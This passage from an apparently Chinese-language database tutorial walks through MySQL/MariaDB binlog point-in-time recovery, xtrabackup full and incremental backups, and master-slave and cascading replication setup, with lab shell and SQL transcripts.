--single-transaction --master-data=2 &gt; /backup/allbackup_`date +%F_%T`.sql</span><br>mysqldump: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br><br><span class="hljs-comment">#模拟完全备份后数据更新</span><br>MariaDB [testdb]&gt; insert students (name,age,gender) values(<span class="hljs-string">&#x27;rose&#x27;</span>,20,<span class="hljs-string">&#x27;f&#x27;</span>);<br>Query OK, 1 row affected (0.001 sec)<br>MariaDB [testdb]&gt; insert students (name,age,gender) values(<span class="hljs-string">&#x27;jack&#x27;</span>,22,<span class="hljs-string">&#x27;M&#x27;</span>);<br>Query OK, 1 row affected (0.001 sec)<br><br><span class="hljs-comment">#10：00误删除了一个重要的表</span><br>MariaDB [testdb]&gt; drop table students;<br>Query OK, 0 rows affected (0.021 sec)<br><br><span class="hljs-comment">#模拟后续其它表继续更新</span><br>MariaDB [testdb]&gt; use hellodb;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br>Database changed<br>MariaDB [hellodb]&gt; insert teachers (name,age,gender)values(<span class="hljs-string">&#x27;wang&#x27;</span>,30,<span class="hljs-string">&#x27;M&#x27;</span>);<br>Query OK, 1 row affected (0.002 sec)<br>MariaDB [hellodb]&gt; insert teachers (name,age,gender)values(<span class="hljs-string">&#x27;mage&#x27;</span>,28,<span class="hljs-string">&#x27;M&#x27;</span>);<br>Query OK, 1 row affected (0.002 sec)<br>MariaDB [hellodb]&gt; select * from teachers;<br>+-----+---------------+-----+--------+<br>| TID | Name          | Age | Gender |<br>+-----+---------------+-----+--------+<br>|   1 | Song Jiang    |  45 | M      |<br>|   2 | Zhang Sanfeng |  94 | M      |<br>|   3 | Miejue Shitai |  77 | F      |<br>|   4 | Lin Chaoying  |  93 | F      |<br>|   5 | wang          |  30 | M      |<br>|   6 | mage          |  28 | M      |<br>+-----+---------------+-----+--------+<br>6 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br><br><span class="hljs-comment">#10：10发现表删除，进行还原</span><br><span class="hljs-comment">#停止数据库访问</span><br><span class="hljs-comment">#从完全备份中，找到二进制位置</span><br>[root@rocky01 ~]<span class="hljs-comment"># grep &#x27;\-\- CHANGE MASTER TO&#x27; allbackup_2022-10-31_14\:52\:32.sql</span><br>-- CHANGE MASTER TO MASTER_LOG_FILE=<span class="hljs-string">&#x27;binlog.000008&#x27;</span>, MASTER_LOG_POS=156;<br><br><span class="hljs-comment">#备份从完全备份后的二进制日志，若生成了新文件bin.000009等），则追加</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysqlbinlog --start-position=156 /var/lib/mysql/binlog.000008 &gt; /backup/inc.sql</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysqlbinlog /var/lib/mysql/mariadb-bin.000009 &gt;&gt; /backup/inc.sql</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysqlbinlog /var/lib/mysql/mariadb-bin.000010 &gt;&gt; /backup/inc.sql</span><br><br><span class="hljs-comment">#找到误删除的语句，从备份中删除此语句</span><br>[root@rocky01 ~]<span class="hljs-comment"># vim /backup/inc.sql</span><br><span class="hljs-comment">#DROP TABLE `students` /* generated by server */</span><br><span class="hljs-comment">#如果文件过大，可以使用sed实现</span><br>[root@rocky01 ~]<span class="hljs-comment"># sed -i &#x27;/^DROP TABLE `students`/d&#x27; /backup/inc.sql</span><br><br><span class="hljs-comment">#利用完全备份和修改过的二进制日志进行还原</span><br>[root@rocky02 ~]<span class="hljs-comment"># mysql -uroot -p</span><br>MariaDB [hellodb]&gt; <span class="hljs-built_in">set</span> sql_log_bin=0;<br>MariaDB [hellodb]&gt; <span class="hljs-built_in">source</span> /backup/allbackup_2019-11-27_10:20:08.sql;<br>MariaDB [hellodb]&gt; <span class="hljs-built_in">source</span> /backup/inc.sql<br>MariaDB [hellodb]&gt; <span class="hljs-built_in">set</span> sql_log_bin=1;<br></code></pre></td></tr></table></figure><h2 id="3-xtrabackup-备份工具"><a href="#3-xtrabackup-备份工具" class="headerlink" title="3 xtrabackup 备份工具"></a>3 xtrabackup 备份工具</h2><blockquote><p>percona提供的mysql数据库备份工具，惟一开源的能够对innodb和xtradb数据库进行热备的工具</p><p><strong>xtrabackup 特点：</strong></p><ul><li>备份还原过程快速、可靠</li><li>备份过程不会打断正在执行的事务</li><li>能够基于压缩等功能节约磁盘空间和流量</li><li>自动实现备份检验</li><li>开源，免费</li></ul><p><a href="https://www.percona.com/downloads/">下载地址</a></p></blockquote><h3 id="3-1-xtrabackup-用法"><a href="#3-1-xtrabackup-用法" class="headerlink" title="3.1 xtrabackup 用法"></a>3.1 xtrabackup 用法</h3><blockquote><p>xtrabackup工具备份和还原，需要三步实现</p><ol><li>备份：对数据库做完全或增量备份</li><li>预准备： 还原前，先对备份的数据，整理至一个临时目录</li><li>还原：将整理好的数据，复制回数据库目录中</li></ol><ul><li><strong>–user：#该选项表示备份账号</strong></li><li><strong>–password：#该选项表示备份的密码</strong></li><li>–host：#该选项表示备份数据库的地址</li><li>–databases：#该选项接受的参数为数据库名，如果要指定多个数据库，彼此间需要以空格隔开；</li></ul><p>     如：”xtra_test dba_test”，同时，在指定某数据库时，也可以只指定其中的某张表。</p><p>     如：”mydatabase.mytable”。该选项对innodb引擎表无效，还是会备份所有innodb表</p><ul><li>–defaults-file：#该选项指定从哪个文件读取MySQL配置，必须放在命令行第一个选项位置</li><li>–incremental：#该选项表示创建一个增量备份，需要指定–incremental-basedir</li><li><strong>–incremental-basedir：#该选项指定为前一次全备份或增量备份的目录，与–incremental同时使用</strong></li><li><strong>–incremental-dir：#该选项表示还原时增量备份的目录</strong></li><li>–include=name：#指定表名，格式：databasename.tablename</li></ul></blockquote><h3 id="实战案例：利用-xtrabackup-实现完全备份及还原"><a href="#实战案例：利用-xtrabackup-实现完全备份及还原" class="headerlink" title="实战案例：利用 xtrabackup 实现完全备份及还原"></a>实战案例：利用 xtrabackup 实现完全备份及还原</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#利用xtrabackup8.0 完全备份和还原MySQL8.0</span><br><span class="hljs-comment">#1 安装xtrabackup包</span><br>[root@centos8 ~]<span class="hljs-comment">#yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm</span><br><br><span class="hljs-comment">#2 在原主机做完全备份到/backup/base</span><br>[root@centos8 ~]<span class="hljs-comment">#mkdir /backup</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup -uroot -p123456 --backup --target-dir=/backup/base</span><br><span class="hljs-comment">#目标主机无需创建/backup目录,直接复制目录本身</span><br>[root@centos8 ~]<span class="hljs-comment">#scp -r /backup/   目标主机:/</span><br><br><span class="hljs-comment">#3 在目标主机上还原</span><br><span class="hljs-comment">#注意：恢复主机MySQL服务停止，并且数据目录为空</span><br><span class="hljs-comment">#1）预准备：确保数据一致，提交完成的事务，回滚未完成的事务</span><br>[root@centos8 ~]<span class="hljs-comment">#yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup --prepare --target-dir=/backup/base</span><br><span class="hljs-comment">#2）复制到数据库目录</span><br><span class="hljs-comment">#注意：数据库目录必须为空，MySQL服务不能启动</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup --copy-back --target-dir=/backup/base</span><br><span class="hljs-comment">#3）还原属性</span><br>[root@centos8 ~]<span class="hljs-comment">#chown -R mysql:mysql /var/lib/mysql</span><br><span class="hljs-comment">#4）启动服务</span><br>[root@centos8 ~]<span class="hljs-comment">#service mysqld start</span><br></code></pre></td></tr></table></figure><h3 id="实战案例：利用xtrabackup完全，增量备份及还原"><a href="#实战案例：利用xtrabackup完全，增量备份及还原" class="headerlink" title="实战案例：利用xtrabackup完全，增量备份及还原"></a>实战案例：利用xtrabackup完全，增量备份及还原</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#利用xtrabackup8.0 完全、增量备份及还原MySQL8.0</span><br><span class="hljs-comment">#1 备份过程</span><br><span class="hljs-comment">#1）完全备份：</span><br>[root@centos8 ~]<span class="hljs-comment">#yum -y install percona-xtrabackup-24-2.4.20-1.el8.x86_64.rpm</span><br>[root@centos8 ~]<span class="hljs-comment">#mkdir /backup/</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup -uroot -p123456 --backup --target-dir=/backup/base</span><br><br><span class="hljs-comment">#2）模拟第一次修改数据</span><br>mysql&gt;insert students (name,age,gender) values(<span class="hljs-string">&#x27;rose&#x27;</span>,20,<span class="hljs-string">&#x27;f&#x27;</span>);<br><span class="hljs-comment">#3）第一次增量备份</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup -uroot -p123456 --backup --target-dir=/backup/inc1 --incremental-basedir=/backup/base</span><br><br><span class="hljs-comment">#4）模拟第二次修改数据</span><br>mysql&gt;insert students (name,age,gender) values(<span class="hljs-string">&#x27;jack&#x27;</span>,22,<span class="hljs-string">&#x27;M&#x27;</span>);<br><span class="hljs-comment">#5）第二次增量</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup -uroot -p123456 --backup --target-dir=/backup/inc2 --incremental-basedir=/backup/inc1</span><br><br><span class="hljs-comment">#6）[root@centos8 ~]#scp -r /backup/* 目标主机:/backup/</span><br><span class="hljs-comment">#备份过程生成三个备份目录/backup/&#123;base，inc1，inc2&#125;</span><br><br><span class="hljs-comment">#2还原过程</span><br><span class="hljs-comment">#1）预准备完成备份，此选项--apply-log-only 阻止回滚未完成的事务</span><br>[root@centos8 ~]<span class="hljs-comment">#yum -y install percona-xtrabackup-24-2.4.20-1.el8.x86_64.rpm</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup --prepare --apply-log-only --target-dir=/backup/base</span><br><br><span class="hljs-comment">#2）合并第1次增量备份到完全备份</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup --prepare --apply-log-only --target-dir=/backup/base --incremental-dir=/backup/inc1</span><br><br><span class="hljs-comment">#3）合并第2次增量备份到完全备份：最后一次还原不需要加选项--apply-log-only</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup --prepare --target-dir=/backup/base --incremental-dir=/backup/inc2</span><br><br><span class="hljs-comment">#4）复制到数据库目录，注意数据库目录必须为空，MySQL服务不能启动</span><br>[root@centos8 ~]<span class="hljs-comment">#xtrabackup --copy-back --target-dir=/backup/base</span><br><br><span class="hljs-comment">#5）还原属性：</span><br>[root@centos8 ~]<span class="hljs-comment">#chown -R mysql:mysql /var/lib/mysql</span><br><span class="hljs-comment">#6）启动服务：</span><br>[root@centos8 ~]<span class="hljs-comment">#service mysqld start</span><br></code></pre></td></tr></table></figure><h1 id="-4"><a href="#-4" class="headerlink" title=""></a></h1><hr><h1 id="六、MySQL-集群-Cluster"><a href="#六、MySQL-集群-Cluster" class="headerlink" title="六、MySQL 集群 Cluster"></a>六、MySQL 集群 Cluster</h1><h2 id="1-MySQL-主从复制"><a href="#1-MySQL-主从复制" class="headerlink" title="1 MySQL 主从复制"></a>1 MySQL 主从复制</h2><h3 id="1-1-主从复制架构和原理"><a href="#1-1-主从复制架构和原理" class="headerlink" title="1.1 主从复制架构和原理"></a>1.1 主从复制架构和原理</h3><h4 id="（1）MySQL的主从复制"><a href="#（1）MySQL的主从复制" class="headerlink" title="（1）MySQL的主从复制"></a>（1）MySQL的主从复制</h4><blockquote><ul><li>读写分离</li><li>复制：每个节点都有相同的数据集，向外扩展，基于二进制日志的单向复制</li></ul></blockquote><h4 id="（2）主从复制原理"><a href="#（2）主从复制原理" class="headerlink" title="（2）主从复制原理"></a>（2）主从复制原理</h4><blockquote><p><strong>主从复制相关线程</strong></p><ul><li>主节点：</li></ul><p>     <strong>dump Thread****：</strong>为每个Slave的I/O Thread启动一个dump线程，用于向其发送binary log events</p><ul><li>从节点：</li></ul><p>     <strong>I/O Thread****：</strong>向Master请求二进制日志事件，并保存于中继日志中</p><p>     <strong>SQL Thread****：</strong>从中继日志中读取日志事件，在本地完成重放</p><p><strong>跟复制功能相关的文件：</strong></p><ul><li><strong>master.info</strong>：用于保存slave连接至master时的相关信息，例如账号、密码、服务器地址等</li><li><strong>relay-log.info</strong>：保存在当前slave节点上已经复制的当前二进制日志和本地relay log日志的对应关系</li><li>mysql-relay-bin.00000#: 中继日志,保存从主节点复制过来的二进制日志,本质就是二进制日志</li></ul><p><strong>复制需要考虑二进制日志事件记录格式</strong></p><ul><li>STATEMENT（5.0之前）, Mariadb5.5 默认使用此格式</li><li>ROW（5.1之后，推荐）,MySQL 8.0 默认使用此格式</li><li>MIXED: Mariadb10.3 默认使用此格式</li></ul></blockquote><p> <a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221031164131126-799572710.png"><img src="2927659-20221031164131126-799572710.png" alt="img"></a></p><h3 id="1-2-实现主从复制配置"><a href="#1-2-实现主从复制配置" class="headerlink" title="1.2 实现主从复制配置"></a>1.2 实现主从复制配置</h3><h4 id="主节点配置"><a href="#主节点配置" class="headerlink" title="主节点配置"></a>主节点配置</h4><blockquote><p>(1) 启用二进制日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>log_bin<br></code></pre></td></tr></table></figure><p>(2) 为当前节点设置一个全局惟一的ID号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>server-id=<span class="hljs-comment">#</span><br><br><span class="hljs-comment">#说明：</span><br><span class="hljs-comment">#server-id的取值范围</span><br><span class="hljs-comment">#1 to 4294967295 (&gt;= MariaDB 10.2.2)，默认值为1，MySQL8.0默认值为1</span><br><span class="hljs-comment">#0 to 4294967295 (&lt;= MariaDB 10.2.1)，默认值为0，如果从节点为0，所有master都将拒绝此slave的连接</span><br></code></pre></td></tr></table></figure><p>(3) 查看从二进制日志的文件和位置开始进行复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW MASTER STATUS;<br></code></pre></td></tr></table></figure><p>(4) 创建有复制权限的用户账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">GRANT REPLICATION SLAVE ON *.* TO <span class="hljs-string">&#x27;repluser&#x27;</span>@<span class="hljs-string">&#x27;HOST&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br><span class="hljs-comment">#MySQL8.0 分成两步实现</span><br>mysql&gt; create user repluser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br>mysql&gt; grant replication slave on *.* to repluser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br></code></pre></td></tr></table></figure></blockquote><h4 id="从节点配置"><a href="#从节点配置" class="headerlink" title="从节点配置"></a>从节点配置</h4><blockquote><p>(1) 启动中继日志（二进制日志）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>server_id=<span class="hljs-comment"># #为当前节点设置一个全局惟的ID号</span><br>log-bin<br>read_only=ON <span class="hljs-comment">#设置数据库只读，针对supper user超级用户无效</span><br></code></pre></td></tr></table></figure><p>(2) 使用有复制权限的用户账号连接至主服务器，并启动复制线程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">CHANGE MASTER TO <br>  MASTER_HOST=<span class="hljs-string">&#x27;masterhost&#x27;</span>, <br>  MASTER_USER=<span class="hljs-string">&#x27;repluser&#x27;</span>, <br>  MASTER_PASSWORD=<span class="hljs-string">&#x27;123456&#x27;</span>, <br>  MASTER_PORT=3306,<br>  MASTER_LOG_FILE=<span class="hljs-string">&#x27;mariadb-bin.xxxxxx&#x27;</span>, <br>  MASTER_LOG_POS= <br>  MASTER_DELAY=3; <span class="hljs-comment">#可指定延迟复制实现访问误操作（默认10s）,单位秒</span><br><br>start slave [IO_THREAD|SQL_THREAD];<br>SHOW SLAVE STATUS;<br><span class="hljs-comment">#查看 relaylog 事件</span><br>SHOW RELAYLOG EVENTS <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;relay-bin.00000x&#x27;</span>;<br></code></pre></td></tr></table></figure></blockquote><h3 id="1-3-主从复制相关命令"><a href="#1-3-主从复制相关命令" class="headerlink" title="1.3 主从复制相关命令"></a>1.3 主从复制相关命令</h3><h4 id="从节点清除信息"><a href="#从节点清除信息" class="headerlink" title="从节点清除信息"></a>从节点清除信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注意：以下都需要先 STOP SLAVE</span><br>RESET SLAVE <span class="hljs-comment">#从服务器清除master.info ，relay-log.info, relay log ，开始新的relay log</span><br>RESET SLAVE ALL <span class="hljs-comment">#清除所有从服务器上设置的主服务器同步信息，如HOST，PORT, USER和 PASSWORD 等</span><br></code></pre></td></tr></table></figure><h4 id="跳过复制错误"><a href="#跳过复制错误" class="headerlink" title="跳过复制错误"></a>跳过复制错误</h4><blockquote><p><strong>可以在从服务器忽略几个主服务器的复制事件，此为global变量，或指定跳过事件的ID</strong></p><p>注意: Centos 8.1以上版本上的MariaDB10.3主从节点同时建同名的库和表不会冲突，建主键记录会产生冲突</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#系统变量，指定跳过复制事件的个数</span><br>SET GLOBAL sql_slave_skip_counter = N<br><br><span class="hljs-comment">#服务器选项，只读系统变量，指定跳过事件的ID；show slave status\G 可查看到错误id</span><br>[mysqld]<br>slave_skip_errors=1007|ALL<br></code></pre></td></tr></table></figure></blockquote><h4 id="START-SLAVE-语句"><a href="#START-SLAVE-语句" class="headerlink" title="START SLAVE 语句"></a>START SLAVE 语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">START SLAVE [thread_types]<br>START SLAVE [SQL_THREAD] UNTIL MASTER_LOG_FILE = <span class="hljs-string">&#x27;log_name&#x27;</span>, MASTER_LOG_POS = log_pos<br>START SLAVE [SQL_THREAD] UNTIL RELAY_LOG_FILE = <span class="hljs-string">&#x27;log_name&#x27;</span>, RELAY_LOG_POS = log_pos<br><br>thread_types:<br>    [thread_type [, thread_type] ... ]<br>thread_type: IO_THREAD | SQL_THREAD<br></code></pre></td></tr></table></figure><h4 id="范例：主从复制（非新建）"><a href="#范例：主从复制（非新建）" class="headerlink" title="范例：主从复制（非新建）"></a>范例：主从复制（非新建）</h4><blockquote><p><strong>模拟主服务器非新建时</strong>**,**<strong>主服务器运行一段时间后，新增从节点服务器</strong></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#主节点10.0.0.8</span><br>[root@master ~]<span class="hljs-comment">#dnf -y install mysql-server</span><br>[root@master ~]<span class="hljs-comment">#vim /etc/my.cnf</span><br>[mysqld]<br>server-id=8<br>log_bin=/data/logbin/mysql-bin<br>[root@master ~]<span class="hljs-comment">#mkdir /data/logbin</span><br>[root@master ~]<span class="hljs-comment">#chown mysql:mysql /data/logbin</span><br>[root@master ~]<span class="hljs-comment">#systemctl restart mysqld</span><br><br><span class="hljs-comment">#创建复制用户</span><br>mysql&gt;create user <span class="hljs-string">&#x27;repluser&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br>mysql&gt;grant replication slave on *.* to <span class="hljs-string">&#x27;repluser&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br><span class="hljs-comment">#如果是MySQL8.0以下版本可一步实现（授权时若用户不存在会自动创建）</span><br>MariaDB [(none)]&gt; grant replication slave on *.* to repluser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-comment">#完全备份(先创建授权用户在备份的好处：万一从节点成了主节点以后就不用在创建授权账号了)</span><br>[root@master ~]<span class="hljs-comment">#mysqldump -uroot -p123456 -A -F --single-transaction --master-data=1 &gt; /backup/fullbackup_`date +%F_%T`.sql</span><br>mysqldump: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>[root@master ~]<span class="hljs-comment">#scp -r /backup/ 10.0.0.18:/</span><br><br><span class="hljs-comment">#从节点10.0.0.18</span><br>[root@slave1 ~]<span class="hljs-comment">#dnf -y install mysql-server</span><br>[root@slave1 ~]<span class="hljs-comment">#vim /etc/my.cnf</span><br>[mysqld]<br>server-id=18<br>read-only <span class="hljs-comment">#只读，建议加上</span><br><br>[root@slave1 ~]<span class="hljs-comment">#systemctl restart mysqld</span><br>[root@slave1 ~]<span class="hljs-comment">#mysql </span><br>mysql&gt; <span class="hljs-built_in">help</span> change master to<br>[root@slave1 ~]<span class="hljs-comment">#vim /backup/fullbackup_2022-10-31_21\:48\:48.sql</span><br>CHANGE MASTER TO<br>  MASTER_HOST=<span class="hljs-string">&#x27;10.0.0.8&#x27;</span>,<br>  MASTER_USER=<span class="hljs-string">&#x27;repluser&#x27;</span>,<br>  MASTER_PASSWORD=<span class="hljs-string">&#x27;123456&#x27;</span>,<br>  MASTER_PORT=3306,<br>  MASTER_LOG_FILE=<span class="hljs-string">&#x27;mysql-bin.000003&#x27;</span>, MASTER_LOG_POS=156;<br><br>mysql&gt; <span class="hljs-built_in">set</span> sql_log_bin=0;<br>Query OK, 0 rows affected (0.00 sec)<br>mysql&gt; <span class="hljs-built_in">source</span> fullbackup_2022-10-31_21:48:48.sql;<br>mysql&gt; <span class="hljs-built_in">set</span> sql_log_bin=1;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; start slave;<br>Query OK, 0 rows affected, 1 warning (0.000 sec)<br>mysql&gt; show slave status\G<br>*************************** 1. row ***************************<br>               Slave_IO_State: Waiting <span class="hljs-keyword">for</span> <span class="hljs-built_in">source</span> to send event<br>                  Master_Host: 10.0.0.8<br>                  Master_User: repluser<br>                  Master_Port: 3306<br>                Connect_Retry: 60<br>              Master_Log_File: mysql-bin.000003<br>          Read_Master_Log_Pos: 156<br>               Relay_Log_File: rocky02-relay-bin.000002<br>                Relay_Log_Pos: 324<br>        Relay_Master_Log_File: mysql-bin.000003<br>             Slave_IO_Running: Yes<br>            Slave_SQL_Running: Yes<br>...省略...<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>, 1 warning (0.01 sec)<br></code></pre></td></tr></table></figure><h3 id="1-4-实现级联复制"><a href="#1-4-实现级联复制" class="headerlink" title="1.4 实现级联复制"></a>1.4 实现级联复制</h3><blockquote><p>需要在中间的从服务器启用以下配置 ，<strong>实现中间slave节点能将master的二进制日志在本机进行数据库更新，并且也同时更新本机的二进制</strong>，从而实现级联复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>server-id=18<br>log_bin<br>log_slave_updates      <span class="hljs-comment">#级联复制中间节点的必选项,MySQL8.0此为默认值,可以不要人为添加,其它版本默认不开启</span><br>read-only<br></code></pre></td></tr></table></figure></blockquote><p><strong><a href="https://img2022.cnblogs.com/blog/2927659/202211/2927659-20221101211217831-989078873.png"><img src="2927659-20221101211217831-989078873.png" alt="img"></a></strong></p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在10.0.0.8充当master</span><br><span class="hljs-comment">#在10.0.0.18充当级联slave</span><br><span class="hljs-comment">#在10.0.0.28充当slave</span><br><span class="hljs-comment">#在master实现</span><br>[root@centos8 ~]<span class="hljs-comment">#vim /etc/my.cnf.d/mariadb-server.cnf</span><br>[mysqld]<br>server-id=8<br>log-bin  <br>[root@centos8 ~]<span class="hljs-comment">#systemctl restart mariadb</span><br>[root@centos8 ~]<span class="hljs-comment">#mysql </span><br>MariaDB [(none)]&gt; grant replication slave on *.* to repluser@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br>[root@centos8 ~]<span class="hljs-comment">#mysqldump -A -F --single-transaction --master-data=1 &gt; /data/all.sql</span><br>[root@centos8 ~]<span class="hljs-comment">#scp /data/all.sql 10.0.0.18:/data</span><br>[root@centos8 ~]<span class="hljs-comment">#scp /data/all.sql 10.0.0.28:/data</span><br><br><span 